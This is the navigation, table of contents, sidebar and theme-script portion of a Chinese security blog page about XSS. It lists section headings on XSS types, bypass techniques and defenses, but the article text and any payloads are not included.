href="/2025/05/27/%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">基于xss-lab的绕过</div></div></a></div><div class="next-post pull-right"><a href="/2025/05/27/%E5%88%A9%E7%94%A8%E8%93%9D%E8%8E%B2%E8%8A%B1BlueLotus%E9%80%9A%E8%BF%87XSS%E8%8E%B7%E5%8F%96Cookie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">利用蓝莲花BlueLotus通过XSS获取Cookie</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">这个世界值得我们无限探索</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Attackxu</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hhhanxx" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/487720257" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">5.1.</span> <span class="toc-text">反射型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">6.1.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">6.2.</span> <span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">6.2.2.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8BXSS"><span class="toc-number">7.</span> <span class="toc-text">其他类型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MXSS"><span class="toc-number">7.1.</span> <span class="toc-text">MXSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UXSS"><span class="toc-number">7.2.</span> <span class="toc-text">UXSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG-XSS"><span class="toc-number">7.3.</span> <span class="toc-text">SVG-XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-XSS"><span class="toc-number">7.4.</span> <span class="toc-text">HTML-XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PDF-XSS"><span class="toc-number">7.5.</span> <span class="toc-text">PDF-XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flash-XSS%EF%BC%88SWF-XSS%EF%BC%89"><span class="toc-number">7.6.</span> <span class="toc-text">Flash-XSS（SWF-XSS）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exif-XSS"><span class="toc-number">7.7.</span> <span class="toc-text">Exif-XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">8.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-1"><span class="toc-number">8.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-1"><span class="toc-number">8.2.</span> <span class="toc-text">存储型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F"><span class="toc-number">9.</span> <span class="toc-text">常见事件处理程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">10.</span> <span class="toc-text">常见测试代码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">11.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AFCSP"><span class="toc-number">11.1.</span> <span class="toc-text">开启CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8HttpOnly"><span class="toc-number">11.2.</span> <span class="toc-text">使用HttpOnly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Filter"><span class="toc-number">11.3.</span> <span class="toc-text">XSS Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-number">11.4.</span> <span class="toc-text">输入过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E8%BD%AC%E4%B9%89"><span class="toc-number">11.5.</span> <span class="toc-text">输出转义</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">12.</span> <span class="toc-text">基于xss-lab的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">12.1.</span> <span class="toc-text">闭合双引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BB%95%E8%BF%87%EF%BC%88%E4%BD%BF%E7%94%A8%E4%B8%8D%E8%A2%AB%E5%AE%9E%E4%BD%93%E5%8C%96%E7%9A%84%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0payload%EF%BC%89"><span class="toc-number">12.2.</span> <span class="toc-text">实体化绕过（使用不被实体化的字符构造payload）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BB%95%E8%BF%87"><span class="toc-number">12.3.</span> <span class="toc-text">实体化绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E9%97%AD%E5%90%88"><span class="toc-number">12.4.</span> <span class="toc-text">使用其他标签闭合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">12.5.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">12.6.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode"><span class="toc-number">12.7.</span> <span class="toc-text">Unicode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode-%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">12.8.</span> <span class="toc-text">Unicode+内容检测绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hidden%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE"><span class="toc-number">12.9.</span> <span class="toc-text">hidden参数传递数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Referer%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE"><span class="toc-number">12.10.</span> <span class="toc-text">Referer参数传递数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ua%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE"><span class="toc-number">12.11.</span> <span class="toc-text">Ua参数传递数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE"><span class="toc-number">12.12.</span> <span class="toc-text">Cookie参数传递数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exif-xss"><span class="toc-number">12.13.</span> <span class="toc-text">exif-xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ng-include"><span class="toc-number">12.14.</span> <span class="toc-text">ng-include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%88-0a%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">12.15.</span> <span class="toc-text">空格被过滤（%0a绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#embed%E6%A0%87%E7%AD%BE"><span class="toc-number">12.16.</span> <span class="toc-text">embed标签</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/" title="流量特征">流量特征</a><time datetime="2025-05-27T11:58:51.000Z" title="发表于 2025-05-27 19:58:51">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/src%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%97%AE%E9%A2%98/" title="src中遇到的http请求头问题">src中遇到的http请求头问题</a><time datetime="2025-05-27T11:57:04.000Z" title="发表于 2025-05-27 19:57:04">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2025-05-27T11:55:58.000Z" title="发表于 2025-05-27 19:55:58">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/SpringBoot/" title="SpringBoot">SpringBoot</a><time datetime="2025-05-27T11:55:22.000Z" title="发表于 2025-05-27 19:55:22">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Maven/" title="Maven">Maven</a><time datetime="2025-05-27T11:55:04.000Z" title="发表于 2025-05-27 19:55:04">2025-05-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="Attackxu" target="_blank">Attackxu</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 0.88rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 0.88rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 0.88rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>2</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 0.88rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 0.88rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Attackxu 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
